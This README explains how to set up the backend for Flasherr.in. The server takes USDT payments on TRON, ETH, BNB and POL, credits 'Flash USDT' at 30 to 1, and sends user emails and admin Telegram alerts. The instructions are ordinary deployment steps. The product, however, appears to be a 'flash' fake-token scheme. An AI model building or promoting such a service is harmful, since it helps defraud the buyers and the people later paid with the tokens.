# Flasherr Backend Server

This is the backend server for Flasherr.in that handles transaction submissions, sends email confirmations to users, and sends Telegram notifications to the admin.

## Features

- ✅ Process transaction submissions from all networks (TRON, ETH, BNB, POL)
- ✅ Send confirmation emails to users
- ✅ Send Telegram notifications to admin
- ✅ Validate minimum amounts (33.33 USDT = 1000 Flash USDT)
- ✅ Calculate Flash USDT amounts (1 USDT = 30 Flash USDT)

## Setup Instructions

### 1. Deploy to Railway

1. Go to [Railway.app](https://railway.app)
2. Create a new project
3. Connect your GitHub repository or upload the `server` folder
4. Railway will automatically detect the Node.js app and deploy it

### 2. Configure Environment Variables

In your Railway project dashboard, add these environment variables:

```
EMAIL_USER=your-email@gmail.com
EMAIL_PASS=your-gmail-app-password
TELEGRAM_BOT_TOKEN=your-telegram-bot-token
TELEGRAM_CHAT_ID=your-telegram-chat-id
```

### 3. Gmail Setup (for email notifications)

1. Enable 2-factor authentication on your Gmail account
2. Generate an App Password:
   - Go to Google Account settings
   - Security → 2-Step Verification → App passwords
   - Generate a new app password for "Mail"
   - Use this password in `EMAIL_PASS`

### 4. Telegram Bot Setup (for admin notifications)

1. Create a Telegram bot:
   - Message @BotFather on Telegram
   - Send `/newbot`
   - Follow instructions to create your bot
   - Copy the bot token to `TELEGRAM_BOT_TOKEN`

2. Get your Chat ID:
   - Message your bot
   - Go to: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
   - Find your chat ID in the response
   - Use this ID in `TELEGRAM_CHAT_ID`

### 5. Update Form Actions

After deployment, update the form actions in your HTML files:

Replace `https://your-railway-app.railway.app` with your actual Railway URL in:
- `final/9.html` (TRON)
- `final/7.html` (ETH)
- `final/6.html` (BNB)
- `final/15.html` (POL)

## API Endpoints

- `POST /transaction/:type` - Submit transaction
  - Types: 6 (BNB), 7 (ETH), 9 (TRON), 15 (POL)
- `GET /health` - Health check
- `GET /` - Server info

## Transaction Flow

1. User fills out form on final page
2. Form submits to Railway server
3. Server validates data and calculates Flash USDT
4. Server sends confirmation email to user
5. Server sends Telegram notification to admin
6. Server returns success response

## Testing

Test your server by visiting:
- `https://your-railway-url.railway.app/health` - Should return server status
- `https://your-railway-url.railway.app/` - Should return API info

## Troubleshooting

- Check Railway logs for errors
- Verify all environment variables are set
- Test email credentials separately
- Test Telegram bot token and chat ID
- Ensure forms point to correct Railway URL
